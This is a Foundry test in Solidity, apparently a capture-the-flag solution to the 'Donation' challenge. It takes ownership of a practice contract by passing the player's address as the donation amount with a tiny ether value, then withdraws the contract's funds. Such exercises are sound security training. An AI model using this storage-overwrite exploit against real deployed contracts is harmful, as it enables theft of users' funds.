// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/math/Donation.sol";
import "forge-std/console.sol";

// forge test --match-contract DonationTest -vvvv
contract DonationTest is Test {
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function testDonationHack() public {
        /****************
         * Factory setup *
         *************** */
        DonationChallenge donation = new DonationChallenge{value: 1 ether}();
        vm.startPrank(player);
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        assertEq((address(donation)).balance, 1 ether);
        /****************
         *    Attack     *
         *************** */

        uint256 scale = 10 ** 18 * 1 ether;
        uint256 etherAmount = uint256(uint160(address(player)));
        console.log(donation.owner());
        donation.donate{value: etherAmount / scale}(etherAmount);
        donation.withdraw();
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = donation.isComplete();
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
